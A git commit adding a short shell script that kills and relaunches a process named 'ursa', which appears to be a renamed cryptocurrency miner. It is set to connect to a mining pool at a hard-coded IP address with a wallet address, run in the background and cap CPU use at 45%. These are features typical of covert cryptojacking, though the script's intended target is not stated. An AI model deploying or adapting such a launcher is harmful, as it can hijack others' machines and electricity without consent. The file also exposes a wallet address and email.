7aca498bfcc197a7e36928f4548ab8cc01f80f5c
duplo1 <46064321+duplo1@users.noreply.github.com>
2019-03-26 22:39:51 +0100

    Add files via upload

---
+++ 75.sh
@@ -0,0 +1,3 @@
+pkill ursa
+sleep 7
+ursa -o 116.203.150.90:5759 -u 41tYiqHAhGRF4YNP8q9CrNECEYnjiycnML3Y13nXKKKi6duuiXQ5oTjiaYr1QZzxnrRSqA7iukACzU44Lakv5AXPLUaMc3g --pass=12:kotminkot@yandex.ru --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=45 --av=1 --variant -1
